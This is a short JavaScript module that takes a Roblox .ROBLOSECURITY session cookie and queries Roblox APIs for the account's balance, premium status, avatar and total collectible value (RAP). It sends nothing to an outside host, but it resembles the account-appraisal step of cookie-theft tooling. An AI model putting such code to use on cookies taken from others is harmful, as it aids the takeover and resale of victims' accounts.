const axios = require("axios");

class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        try {
            const response = await axios.get(url, {
                headers: { Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}` }
            });
            return response.data;
        } catch (error) {
            console.warn(`Request to ${url} failed. This might be okay.`, error.response?.status);
            return null;
        }
    }

    static async register(roblosecurityCookie) {
        const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
            headers: { Cookie: `.ROBLOSECURITY=${roblosecurityCookie}` }
        });
        return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
    }

    async getAccountBodyShot() {
        const d = await this.doAuthorizedRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${this.userId}&size=720x720&format=Png&isCircular=false`);
        return d?.data[0]?.imageUrl || null;
    }

    async getAccountRAP() {
        let rap = 0;
        let cursor = "";
        try {
            do {
                const page = await this.doAuthorizedRequest(`https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${cursor}`);
                if (!page?.data) break;
                rap += page.data.reduce((acc, item) => acc + (item.recentAveragePrice || 0), 0);
                cursor = page.nextPageCursor;
            } while (cursor);
        } catch (e) {
            console.error("Could not calculate RAP.", e.message);
        }
        return rap;
    }

    async getUserData() {
        const [premiumStatus, balanceData, rap, avatarUrl] = await Promise.all([
            this.doAuthorizedRequest(`https://premiumfeatures.roblox.com/v1/users/${this.userId}/validate-membership`),
            this.doAuthorizedRequest(`https://economy.roblox.com/v1/users/${this.userId}/currency`),
            this.getAccountRAP(),
            this.getAccountBodyShot()
        ]);

        return {
            username: this.username,
            uid: this.userId,
            displayName: this.displayName,
            avatarUrl: avatarUrl,
            balance: balanceData?.robux || 0,
            isPremium: !!premiumStatus,
            rap: rap || 0,
        };
    }
}

module.exports = { RobloxUser };
